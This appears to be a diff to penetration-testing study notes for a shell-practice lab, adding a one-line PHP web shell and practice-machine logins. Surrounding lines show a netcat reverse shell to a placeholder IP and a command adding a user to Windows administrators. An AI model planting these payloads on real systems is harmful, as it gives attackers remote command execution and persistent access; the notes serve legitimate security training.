@@ -179,6 +179,12 @@ Reverse:
 mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
 ```
 
+Webshell (PHP):
+
+```php
+<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
+```
+
 Powershell:
 
 ```powershell
@@ -204,7 +210,4 @@ net localgroup administrators <username> /add
 | Title | IP Address | Username | Password |
 | :---- | :---- | :---- | :---- |
 | Linux Shell Practice | 10.10.131.227 | shell | TryH4ckM3! |
-| | | Administrator | TryH4ckM3! |
-
-
-
+| Win Shell Practice | 10.10.123.247 | Administrator | TryH4ckM3! |
